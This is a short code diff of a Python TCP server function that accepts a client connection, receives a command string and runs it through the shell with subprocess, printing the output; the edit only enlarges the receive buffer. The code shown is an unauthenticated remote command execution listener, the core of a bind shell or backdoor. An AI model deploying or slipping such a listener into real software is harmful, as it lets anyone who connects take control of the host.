@@ -62,7 +62,7 @@ def server_TCP(server_ip, server_port):
         elif System.lower() == "windows":
             subprocess.run('cls', shell=True)
         print(Fore.WHITE + f"Accepted connection from {client_address[0]}:{client_address[1]}")
-        command = client_socket.recv(1024).decode('utf-8')
+        command = client_socket.recv(4096).decode('utf-8')
         print('command:', command)
         result = subprocess.run(command, shell=True, capture_output=True, text=True)
         print("Output:", result.stdout)
